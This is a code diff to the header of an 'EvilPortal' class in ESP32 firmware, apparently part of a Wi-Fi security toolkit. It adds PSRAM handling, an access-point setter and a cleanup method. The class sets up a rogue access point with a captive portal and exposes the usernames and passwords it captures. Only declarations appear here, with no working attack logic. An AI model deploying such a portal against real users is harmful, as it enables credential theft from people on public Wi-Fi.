@@ -6,6 +6,7 @@
 #include "ESPAsyncWebServer.h"
 #include <AsyncTCP.h>
 #include <DNSServer.h>
+#include <WiFi.h>
 
 #include "configs.h"
 #include "settings.h"
@@ -37,7 +38,12 @@ extern Buffer buffer_obj;
 #define WIFI_SCAN_EVIL_PORTAL 30
 
 char apName[MAX_AP_NAME_SIZE] = "PORTAL";
-char index_html[MAX_HTML_SIZE] = "TEST";
+
+#ifndef HAS_PSRAM
+  char index_html[MAX_HTML_SIZE] = "TEST";
+#else
+  extern char* index_html;
+#endif
 
 struct ssid {
   String essid;
@@ -51,7 +57,8 @@ struct AccessPoint {
   uint8_t channel;
   uint8_t bssid[6];
   bool selected;
-  LinkedList<char>* beacon;
+ // LinkedList<char>* beacon;
+  char beacon[2];
   int8_t rssi;
   LinkedList<uint16_t>* stations;
   uint16_t packets;
@@ -83,7 +90,6 @@ class EvilPortal {
     String password;
 
     bool has_html;
-    bool has_ap;
 
     DNSServer dnsServer;
 
@@ -99,15 +105,20 @@ class EvilPortal {
   public:
     EvilPortal();
 
+    int ap_index = -1;
+
     String target_html_name = "index.html";
     uint8_t selected_html_index = 0;
 
     bool using_serial_html;
+    bool has_ap;
 
     LinkedList<String>* html_files;
 
+    void cleanup();
     String get_user_name();
     String get_password();
+    bool setAP(String essid);
     void setup();
     bool begin(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points);
     void main(uint8_t scan_mode);
